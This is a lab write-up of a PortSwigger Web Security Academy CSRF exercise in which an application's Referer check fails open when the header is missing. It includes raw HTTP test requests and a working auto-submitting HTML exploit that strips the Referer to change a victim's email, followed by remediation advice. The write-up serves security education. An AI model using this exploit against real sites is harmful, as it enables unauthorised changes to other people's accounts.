CSRF — Referer Validation Depends on Header Being Present

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite Community Edition, Burp Repeater, HTML, Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 03

1. Objective

Identify and exploit a CSRF vulnerability caused by incorrect validation of the HTTP Referer header.

The application checks the Referer header to prevent cross-site requests. However, it allows sensitive operations when this header is completely absent.

2. Attack Scenario

An attacker wants to change the email address of an authenticated victim.

The attacker does not know the victim's password or session cookie.

However, the attacker discovers that the application rejects requests with an invalid Referer header but accepts requests without this header.

By hosting a malicious HTML form and using a restrictive referrer policy, the attacker can cause the victim's browser to submit a request without a Referer header.

If the victim's session cookie is included, the application processes the unauthorized email change.

3. Testing Referer Validation

I intercepted the email change request and sent it to Burp Repeater.

Test 1 — Invalid Referer

I replaced the original Referer with an external domain:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Referer: https://attacker.example/
Content-Type: application/x-www-form-urlencoded

email=test%40example.net

Result:

Invalid referer header

The application rejected the request.

Test 2 — Missing Referer

I completely removed the Referer header:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=csrf-lab10%40example.net

Result: The server accepted the request, and the account email address changed successfully.

Finding: Referer validation was skipped when the header was absent.

4. Exploitation

I created an HTML proof of concept using PortSwigger Exploit Server.

<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="csrf-lab10-victim@example.net">

</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>

The key element is:

<meta name="referrer" content="no-referrer">

This instructs the browser not to include the Referer header in requests initiated by the page.

Attack Flow
The attacker hosts the malicious HTML page.
The authenticated victim opens the page.
JavaScript automatically submits the email change form.
The browser sends the POST request without a Referer header.
If the session cookie accompanies the request, the application recognizes the authenticated victim.
The server skips Referer validation and changes the victim's email address.
5. Verification

I tested the vulnerability using Burp Repeater.

I then delivered the HTML exploit to the simulated victim through PortSwigger Exploit Server.

Result: ✅ Lab Solved

6. Root Cause

The application incorrectly treats a missing Referer header as acceptable.

Instead of rejecting requests that cannot be verified, the server proceeds with the sensitive operation.

This is an example of fail-open security validation.

7. Security Impact

An attacker can potentially perform unauthorized account changes through the victim's authenticated browser.

The confirmed impact in this laboratory was unauthorized email modification.

Further account compromise would depend on the application's email verification and password recovery mechanisms.

8. Remediation
Use unpredictable, session-bound CSRF tokens for sensitive operations.
Validate the Origin header and use Referer as a fallback where appropriate.
Reject suspicious requests when required origin information is missing.
Use appropriate SameSite cookie settings as defense in depth.
Require additional confirmation for sensitive account changes.
9. Key Takeaways

This lab demonstrated that a missing security header can be as important as an invalid one.

I learned how to:

Test Referer validation using Burp Repeater.
Distinguish between an empty header and a completely absent header.
Use HTML referrer policies to influence browser behavior.
Build and deliver a CSRF proof of concept.
Identify fail-open security logic.

Environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.
